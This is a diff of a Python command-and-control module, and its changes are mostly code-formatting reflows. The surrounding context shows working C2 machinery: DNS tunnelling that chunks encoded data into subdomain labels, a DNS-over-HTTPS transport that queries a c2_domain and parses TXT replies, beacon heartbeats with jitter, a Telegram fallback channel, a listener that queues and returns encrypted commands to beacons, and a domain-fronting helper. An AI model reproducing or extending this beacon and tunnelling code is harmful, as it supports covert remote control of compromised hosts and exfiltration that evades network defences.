@@ -56,6 +56,7 @@ logger = logging.getLogger(__name__)
 # Import centralized config
 try:
     from core.config import C2_CONFIG
+
     DEFAULT_SLEEP_INTERVAL = C2_CONFIG.DEFAULT_SLEEP_INTERVAL
     DEFAULT_JITTER_MIN = C2_CONFIG.JITTER_MIN
     DEFAULT_JITTER_MAX = C2_CONFIG.JITTER_MAX
@@ -590,10 +591,7 @@ class DNSTunneler:
         encoded = encoded.rstrip("=").lower()
 
         # Split into labels of max length
-        labels = [
-            encoded[i : i + self.subdomain_length]
-            for i in range(0, len(encoded), self.subdomain_length)
-        ]
+        labels = [encoded[i : i + self.subdomain_length] for i in range(0, len(encoded), self.subdomain_length)]
 
         return labels
 
@@ -697,6 +695,7 @@ class DNSTunneler:
                 # Real fallback: use low-level socket DNS resolution
                 try:
                     import socket
+
                     addr_info = socket.getaddrinfo(query_name, None, socket.AF_INET)
                     if addr_info:
                         ip_addr = addr_info[0][4][0]
@@ -721,10 +720,7 @@ class DNSTunneler:
             List of data chunks
 
         """
-        chunks = [
-            data[i : i + chunk_size]
-            for i in range(0, len(data), chunk_size)
-        ]
+        chunks = [data[i : i + chunk_size] for i in range(0, len(data), chunk_size)]
         return chunks
 
 
@@ -783,7 +779,9 @@ class DoHTransport:
 
         self.provider = provider
         logger.info(
-            "DoH transport initialized: %s via %s", c2_domain, self.endpoint,
+            "DoH transport initialized: %s via %s",
+            c2_domain,
+            self.endpoint,
         )
 
     def _build_dns_query(self, name: str, qtype: int = 16) -> bytes:
@@ -811,7 +809,13 @@ class DoHTransport:
 
         # Header
         header = struct.pack(
-            ">HHHHHH", txn_id, flags, qdcount, ancount, nscount, arcount,
+            ">HHHHHH",
+            txn_id,
+            flags,
+            qdcount,
+            ancount,
+            nscount,
+            arcount,
         )
 
         # Question section
@@ -869,7 +873,8 @@ class DoHTransport:
 
             if txt_pos + txt_len <= len(txt_data):
                 text = txt_data[txt_pos : txt_pos + txt_len].decode(
-                    "utf-8", errors="ignore",
+                    "utf-8",
+                    errors="ignore",
                 )
                 results.append(text)
 
@@ -912,7 +917,8 @@ class DoHTransport:
 
             # Parse TYPE, CLASS, TTL, RDLENGTH
             rtype, _rclass, _ttl, rdlength = struct.unpack(
-                ">HHIH", data[pos : pos + 10],
+                ">HHIH",
+                data[pos : pos + 10],
             )
             pos += 10
 
@@ -979,8 +985,6 @@ class DoHTransport:
             return False, []
 
 
-
-
 # =============================================================================
 # HEARTBEAT MANAGER
 # =============================================================================
@@ -997,7 +1001,9 @@ class HeartbeatManager:
     """
 
     def __init__(
-        self, config: C2Config, callback: Callable[[], None] | None = None,
+        self,
+        config: C2Config,
+        callback: Callable[[], None] | None = None,
     ) -> None:
         """Initialize heartbeat manager.
 
@@ -1223,10 +1229,7 @@ class C2Channel:
                     self._handle_command(response)
 
                 # LOGIC FIX: Check for additional pending commands (especially for Telegram)
-                if (
-                    hasattr(self, "telegram")
-                    and self.config.protocol == C2Protocol.TELEGRAM
-                ):
+                if hasattr(self, "telegram") and self.config.protocol == C2Protocol.TELEGRAM:
                     extra_cmds = self.telegram.poll_commands()
                     for cmd_bytes in extra_cmds:
                         try:
@@ -1283,19 +1286,14 @@ class C2Channel:
                 )
             elif self.dns_tunneler:
                 success, response = self.dns_tunneler.send_dns_query(encrypted)
-            elif (
-                hasattr(self, "telegram")
-                and self.config.protocol == C2Protocol.TELEGRAM
-            ):
+            elif hasattr(self, "telegram") and self.config.protocol == C2Protocol.TELEGRAM:
                 # LOGIC FIX: Telegram was initialized but never used in send_message
                 self.telegram.send_data(encrypted)
                 # For Telegram, we poll for response immediately or wait for next heartbeat
                 # To match the success/response pattern:
                 cmds = self.telegram.poll_commands()
                 success = True  # Assume sent if no exception
-                response = (
-                    cmds[0] if cmds else b"{}"
-                )  # Mock or return first command as response
+                response = cmds[0] if cmds else b"{}"  # Mock or return first command as response
             else:
                 # Direct HTTP/HTTPS
                 success, response = self._send_direct(encrypted)
@@ -1632,9 +1630,12 @@ class C2Listener:
             except (json.JSONDecodeError, UnicodeDecodeError):
                 payload = {}
 
-            beacon_id = payload.get("id", hashlib.sha256(
-                f"{peer[0]}:{time.time()}".encode(),
-            ).hexdigest()[:16])
+            beacon_id = payload.get(
+                "id",
+                hashlib.sha256(
+                    f"{peer[0]}:{time.time()}".encode(),
+                ).hexdigest()[:16],
+            )
             command = payload.get("cmd", "checkin")
 
             # -- Session bookkeeping ---------------------------------------
@@ -1644,19 +1645,23 @@ class C2Listener:
                     remote_addr=str(peer[0]),
                 )
                 logger.info(
-                    "New beacon registered: %s from %s", beacon_id, peer[0],
+                    "New beacon registered: %s from %s",
+                    beacon_id,
+                    peer[0],
                 )
             session = self._sessions[beacon_id]
             session.last_seen = time.time()
 
             # Store incoming data in history
             if command != "checkin" or payload.get("data"):
-                session.history.append({
-                    "direction": "in",
-                    "command": command,
-                    "data": payload.get("data"),
-                    "ts": time.time(),
-                })
+                session.history.append(
+                    {
+                        "direction": "in",
+                        "command": command,
+                        "data": payload.get("data"),
+                        "ts": time.time(),
+                    }
+                )
 
             # -- Build response --------------------------------------------
             response_data: dict[str, Any] = {"id": beacon_id, "status": "ok"}
@@ -1664,13 +1669,15 @@ class C2Listener:
                 next_cmd = session.pending_commands.pop(0)
                 response_data["cmd"] = next_cmd.command
                 response_data["data"] = next_cmd.data
-                session.history.append({
-                    "direction": "out",
-                    "command": next_cmd.command,
-                    "data": next_cmd.data,
-                    "msg_id": next_cmd.message_id,
-                    "ts": time.time(),
-                })
+                session.history.append(
+                    {
+                        "direction": "out",
+                        "command": next_cmd.command,
+                        "data": next_cmd.data,
+                        "msg_id": next_cmd.message_id,
+                        "ts": time.time(),
+                    }
+                )
 
             encrypted_response = self._encrypt(
                 json.dumps(response_data).encode(),
@@ -1682,8 +1689,7 @@ class C2Listener:
                 b"Content-Type: application/octet-stream\r\n"
                 b"Content-Length: " + str(len(encrypted_response)).encode() + b"\r\n"
                 b"Connection: close\r\n"
-                b"\r\n"
-                + encrypted_response
+                b"\r\n" + encrypted_response
             )
             writer.write(http_response)
             await writer.drain()
@@ -1716,7 +1722,9 @@ class C2Listener:
         self._running = True
         logger.info(
             "C2 Listener started on %s:%d (TLS=%s)",
-            self.host, self.port, self.use_tls and ssl_ctx is not None,
+            self.host,
+            self.port,
+            self.use_tls and ssl_ctx is not None,
         )
 
     async def stop(self) -> None:
@@ -1748,6 +1756,7 @@ class C2Listener:
 # =============================================================================
 # MODULE-LEVEL FUNCTIONS
 # =============================================================================
+
 
 def create_fronted_channel(
     fronting_domain: str,
